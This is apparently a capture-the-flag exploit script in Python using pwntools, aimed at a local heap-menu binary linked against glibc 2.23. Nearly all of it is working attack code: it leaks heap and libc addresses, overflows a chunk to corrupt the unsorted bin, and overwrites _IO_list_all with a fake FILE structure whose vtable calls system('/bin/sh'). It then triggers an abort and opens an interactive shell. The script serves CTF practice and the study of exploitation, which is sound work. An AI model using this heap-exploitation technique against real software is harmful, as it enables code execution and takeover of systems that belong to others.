#!/usr/bin/python3

from pwn import *

r = process('./M', env={"LD_PRELOAD": "./libc-2.23.so"})


def ch(i):
    r.sendafter('choice:', str(i))

def add(size):
    ch(1)
    r.sendafter('Size', str(size))

def delete(idx):
    ch(2)
    r.sendafter('Index', str(idx))

def edit(idx, size, c):
    ch(3)
    r.sendafter('Index', str(idx))
    r.sendafter('Size', str(size))
    r.sendafter('Data', c)

def show(idx):
    ch(4)
    r.sendafter('Index', str(idx))

input()
##### leak heap
r.sendafter('Name', b'A'*0x20)
add(0x80) #0
show(0)
r.recvuntil('A'*0x20)
heap = u64(r.recv(6)+b'\x00\x00') & 0xfffffffff000
log.info(f"heap: {hex(heap)}")

##### leak libc
add(0x80) #1
add(0x80) #2
delete(1)
edit(0, 0x100, b'Q'*0x90)
show(0)
r.recvuntil('Q'*0x90)
libc = u64(r.recv(6)+b'\x00\x00') - 0x3c4b78
log.info(f"libc: {hex(libc)}")

##### overwrite IO_list_all
fd = 0
bk = IO_list_all = libc + 0x3c5520 - 0x10
# smallbin[4] == 0x60
"""
Need write_ptr > write_base, so we write 0 to the write_base and 1 to the write_ptr
"""
vtable = heap + 0x170
system_ = libc + 0x453a0
edit(0, 0x100, b'Q'*0x80 + b'/bin/sh\x00' + p64(0x61) + p64(fd) + p64(bk) + p64(0) + p64(1))
edit(2, 0x100, b'\x00'*0x38 + p64(vtable) + b'b'*0x18 + p64(system_)) # IO_FILE will call vtable+0x18

##### trigger abort
input()
add(0x80)

r.interactive()
